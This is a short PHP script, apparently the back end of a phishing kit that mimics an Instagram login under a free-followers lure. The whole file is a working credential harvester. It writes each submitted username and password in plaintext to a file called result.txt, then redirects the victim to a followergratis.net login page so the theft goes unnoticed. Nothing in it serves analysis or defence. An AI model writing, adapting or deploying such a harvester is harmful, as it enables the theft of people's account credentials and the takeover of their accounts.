<?php
header("Location: http://instagram.followergratis.net/login.php");
$bikintxt = "result.txt";
$yusernem = $_POST['username'];
$paswot = $_POST['password'];

$handle = fopen($bikintxt, 'a');
fwrite($handle, "+=====================================+");
fwrite($handle, "\n");
fwrite($handle, "Username :");
fwrite($handle, "\n");
fwrite($handle, "$yusernem");
fwrite($handle, "\n");
fwrite($handle, "Password :");
fwrite($handle, "\n");
fwrite($handle, "$paswot");
fwrite($handle, "\n");
fwrite($handle, "+=====================================+");
fwrite($handle, "\n");
fclose($handle);
exit;
?>